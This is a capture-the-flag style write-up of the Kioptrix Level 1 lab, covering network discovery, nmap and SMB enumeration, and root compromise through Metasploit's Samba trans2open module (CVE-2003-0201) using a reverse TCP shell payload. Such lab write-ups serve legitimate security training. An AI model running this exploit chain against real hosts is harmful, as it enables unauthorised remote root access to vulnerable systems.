Kioptrix Level 1 – Write-Up

1. Lab Setup

Attacker Machine: Kali Linux
Target Machine: Kioptrix Level 1
Network Mode: Host-Only (192.168.56.0/24) 
Adapter Type: PCnet-FAST III (Am79c973) Necessarily

⸻

2. Discovery

2.1 Host Discovery

To identify the target machine within the local network, I used netdiscover:

sudo netdiscover -r 192.168.56.0/24

The scan revealed the following live host:

192.168.56.102

This IP address was identified as the Kioptrix target machine.

⸻

3. Enumeration

3.1 Port Scanning

To identify open services, I performed a full TCP scan:

sudo nmap -sS -sV -sC -p- 192.168.56.102

Relevant open ports:

21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds

The presence of ports 139 and 445 indicated that SMB was running.

⸻

3.2 SMB Version Detection (Metasploit)

To determine the exact version of Samba, I used Metasploit:

msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.56.102
run

The scan identified:

Samba 2.2.x

This version is known to be vulnerable to the trans2open exploit (CVE-2003-0201).

⸻

4. Exploitation

4.1 Selecting the Exploit

In Metasploit:

use exploit/linux/samba/trans2open


⸻

4.2 Exploit Configuration

set RHOSTS 192.168.56.102
set LHOST 192.168.56.101
set LPORT 4444
set PAYLOAD linux/x86/shell_reverse_tcp
run

Note: The Meterpreter payload was unstable on this legacy system, so a simple reverse shell payload was used instead.

⸻

5. Gaining Access

After running the exploit, a shell session was opened:

Command shell session opened

Privilege verification:

whoami

Output:

root

Root access was successfully obtained.

⸻

6. Post-Exploitation

To verify full system control:

pwd
cd /root
ls

Access to the /root directory confirmed complete system compromise.

⸻

7. Vulnerability Explanation

The target system was running an outdated version of Samba (2.2.x), vulnerable to the trans2open buffer overflow vulnerability (CVE-2003-0201).

This vulnerability allows remote code execution through a specially crafted SMB request, resulting in arbitrary command execution with root privileges.

⸻

8. Conclusion

The objective of Kioptrix Level 1 — obtaining root-level access — was successfully achieved.

The attack chain consisted of:
	•	Network discovery using netdiscover
	•	Service enumeration with nmap
	•	SMB version identification via Metasploit
	•	Exploitation using the trans2open module
	•	Payload adjustment for compatibility
	•	Successful root shell acquisition

